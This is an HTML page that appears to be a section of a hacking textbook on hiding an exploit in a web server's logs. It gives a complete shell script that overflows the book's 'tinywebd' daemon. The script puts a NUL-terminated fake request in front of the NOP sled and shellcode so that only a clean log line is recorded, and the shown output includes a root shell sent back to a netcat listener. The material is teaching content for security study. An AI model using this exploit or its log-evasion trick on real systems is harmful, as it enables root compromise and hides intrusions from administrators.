<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x641 Blend In with the Crowd</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part137.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part139.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark125">0x641 Blend In with the Crowd</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Even though the log files themselves cannot be changed, occasionally what gets logged can be. Log files usually contain many valid entries, whereas exploit attempts stick out like a sore thumb. The tinyweb daemon program can be tricked into logging a valid-looking entry for an exploit attempt.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Look at the source code and see if you can figure out how to do this before continuing on. The idea is to make the log entry look like a valid web request, like the following:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1023.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">07/22/2007 17:57:00&gt; From 127.0.0.1:38127 &quot;HEAD / HTTP/1.0&quot;  200 OK</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">07/25/2007 14:49:14&gt; From 127.0.0.1:50201 &quot;GET / HTTP/1.1&quot;  200 OK</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">07/25/2007 14:49:14&gt; From 127.0.0.1:50202 &quot;GET /image.jpg HTTP/1.1&quot;  200 OK</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">07/25/2007 14:49:14&gt; From 127.0.0.1:50203 &quot;GET /favicon.ico HTTP/1.1&quot;  404 Not Found</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1024.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This type of camouflage is very effective at large enterprises with extensive log files, since there are so many valid requests to hide among: It’s easier to blend in at a crowded mall than an empty street. But how exactly do you hide a big, ugly exploit buffer in the proverbial sheep’s clothing?</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">There’s a simple mistake in the tinyweb daemon’s source code that allows the request buffer to be truncated early when it’s used for the log file output, but not when copying into memory. The <span class="s31">recv_line() </span>function uses <span class="s31">\r\n </span>as the delimiter; however, all the other standard string functions use a null byte for the delimiter. These string functions are used to write to the log file, so by strategically using both delimiters, the data written to the log can be partially controlled.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The following exploit script puts a valid-looking request in front of the rest of the exploit buffer. The NOP sled is shrunk to accommodate the new data.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">xtool_tinywebd_stealth.sh</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1025.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">#!/bin/sh</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"># stealth exploitation tool</p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 106%;text-align: left;">if [ -z &quot;$2&quot; ]; then # If argument 2 is blank echo &quot;Usage: $0 &lt;shellcode file&gt; &lt;target IP&gt;&quot; exit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">fi</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">FAKEREQUEST=&quot;GET / HTTP/1.1\x00&quot;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">FR_SIZE=$(perl -e &quot;print \&quot;$FAKEREQUEST\&quot;&quot; | wc -c | cut -f1 -d &#39; &#39;) OFFSET=540</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">RETADDR=&quot;\x24\xf6\xff\xbf&quot; # At +100 bytes from buffer @ 0xbffff5c0 echo &quot;target IP: $2&quot;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">SIZE=`wc -c $1 | cut -f1 -d &#39; &#39;` echo &quot;shellcode: $1 ($SIZE bytes)&quot;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">echo &quot;fake request: \&quot;$FAKEREQUEST\&quot; ($FR_SIZE bytes)&quot; ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">echo &quot;[Fake Request ($FR_SIZE b)] [NOP ($ALIGNED_SLED_SIZE b)] [shellcode ($SIZE b)] [ret addr ($((4*32)) b)]&quot;</p><p class="s31" style="padding-left: 95pt;text-indent: -4pt;text-align: left;">(perl -e &quot;print \&quot;$FAKEREQUEST\&quot; . \&quot;\x90\&quot;x$ALIGNED_SLED_SIZE&quot;; cat $1;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">perl -e &quot;print \&quot;$RETADDR\&quot;x32 . \&quot;\r\n\&quot;&quot;) | nc -w 1 -v $2 80</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1026.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This new exploit buffer uses the null byte delimiter to terminate the fake request camouflage. A null byte won’t stop the <span class="s31">recv_line() </span>function, so the rest of the exploit buffer is copied to the stack. Since the string functions used to write to the log use a null byte for termination, the fake request is logged and the rest of the exploit is hidden. The following output shows this exploit script in use.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1027.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon. reader@hacking:~/booksrc $ nc -l -p 31337 &amp;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[1] 7714</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ jobs</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[1]+ Running         nc -l -p 31337 &amp;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh loopback_shell 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">shellcode: loopback_shell (83 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">fake request: &quot;GET / HTTP/1.1\x00&quot; (15 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[Fake Request (15 b)] [NOP (318 b)] [shellcode (83 b)] [ret addr (128 b)]</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">localhost [127.0.0.1] 80 (www) open reader@hacking:~/booksrc $ fg</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">nc -l -p 31337 whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1028.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The connection used by this exploit creates the following log file entries on the server machine.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1029.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">08/02/2007 13:37:36&gt; Starting up..</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">08/02/2007 13:37:44&gt; From 127.0.0.1:32828 &quot;GET / HTTP/1.1&quot;   200 OK</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1030.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">Even though the logged IP address cannot be changed using this method, the request itself appears valid, so it won’t attract too much attention.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part139.htm">0x650 Overlooking the Obvious</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part137.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part139.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
